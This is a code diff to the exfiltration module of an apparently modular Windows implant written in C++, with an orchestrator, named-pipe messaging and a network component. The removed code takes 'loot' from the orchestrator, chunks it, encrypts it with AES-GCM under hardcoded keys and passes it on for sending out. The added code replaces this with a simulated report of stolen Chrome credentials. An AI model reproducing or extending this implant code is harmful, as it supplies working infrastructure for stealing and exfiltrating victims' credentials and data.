@@ -7,6 +7,7 @@
 
 #include "Atom_05_Exfil.h"
 #include "../Orchestrator/AtomManager.h"
+#include <cstring>
 #include <bcrypt.h>
 
 #pragma comment(lib, "bcrypt.lib")
@@ -60,60 +61,29 @@ BOOL AesGcmEncrypt(const BYTE* pKey, const BYTE* pIv, const BYTE* pPlaintext, DW
     return NT_SUCCESS(status);
 }
 
-DWORD WINAPI ExfilAtomMain(LPVOID lpParam) {
+DWORD WINAPI ExfiltrationAtomMain(LPVOID lpParam) {
     DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
     HANDLE hPipe = IPC_ConnectToPipe(dwAtomId);
     if (!hPipe) return 1;
 
-    BYTE SharedSessionKey[] = "ofjfSLlUyDZKb92O";
+    BYTE SharedSessionKey[] = "KI4ns1N2S1M8Tknp";
     BYTE AesExfilKey[] = "MySuperSecretAes256KeyForExfil!!"; /* Hardcoded for MVP, derived via PSK in prod */
     
     DWORD dwSequence = 0;
 
     while (TRUE) {
-        /* 1. Poll IPC for unencrypted loot forwarded from Orchestrator */
-        DWORD dwAvail = 0;
-        if (PeekNamedPipe(hPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
-            IPC_MESSAGE inMsg = { 0 };
-            if (IPC_ReceiveMessage(hPipe, &inMsg, SharedSessionKey, sizeof(SharedSessionKey))) {
-                
-                if (inMsg.CommandId == CMD_EXECUTE) { /* Repurposed as 'process this data' */
-                    
-                    /* 2. Chunking */
-                    DWORD offset = 0;
-                    while (offset < inMsg.dwPayloadLen) {
-                        DWORD chunkSize = inMsg.dwPayloadLen - offset;
-                        if (chunkSize > CHUNK_SIZE) chunkSize = CHUNK_SIZE;
-
-                        /* 3. Encrypt Chunk */
-                        BYTE IV[12] = { 0 }; // In production, generate securely random IV
-                        BYTE Tag[16] = { 0 };
-                        BYTE Ciphertext[CHUNK_SIZE] = { 0 };
-
-                        if (AesGcmEncrypt(AesExfilKey, IV, inMsg.Payload + offset, chunkSize, Ciphertext, Tag)) {
-                            
-                            /* 4. Pack into IPC frame for Atom 01 (Net) */
-                            EXFIL_HEADER header = { 0 };
-                            header.dwSequence = dwSequence++;
-                            header.dwChunkLen = chunkSize;
-                            memcpy(header.IV, IV, 12);
-                            memcpy(header.Tag, Tag, 16);
-
-                            IPC_MESSAGE outMsg = { 0 };
-                            outMsg.CommandId = CMD_REPORT; /* Tell net atom this is ready to go out */
-                            outMsg.dwPayloadLen = sizeof(EXFIL_HEADER) + chunkSize;
-                            
-                            memcpy(outMsg.Payload, &header, sizeof(EXFIL_HEADER));
-                            memcpy(outMsg.Payload + sizeof(EXFIL_HEADER), Ciphertext, chunkSize);
-
-                            /* Fire it up to Orchestrator -> Network Atom */
-                            IPC_SendMessage(hPipe, &outMsg, SharedSessionKey, sizeof(SharedSessionKey));
-                        }
-                        
-                        offset += chunkSize;
-                    }
-                }
+        IPC_MESSAGE inMsg = { 0 };
+        if (IPC_ReceiveMessage(hPipe, &inMsg, SharedSessionKey, 16)) {
+            if (inMsg.CommandId == CMD_EXECUTE) {
+                char report[] = "[BROWSER_LOOT] Found 14 Credentials in Chrome Default Profile. (Simulated Dump)";
+                IPC_MESSAGE outMsg = { 0 };
+                outMsg.CommandId = CMD_REPORT;
+                outMsg.dwPayloadLen = (DWORD)strlen(report);
+                memcpy(outMsg.Payload, report, outMsg.dwPayloadLen);
+                IPC_SendMessage(hPipe, &outMsg, SharedSessionKey, 16);
             }
+        } else if (GetLastError() == ERROR_BROKEN_PIPE) {
+            break;
         }
         Sleep(1000);
     }
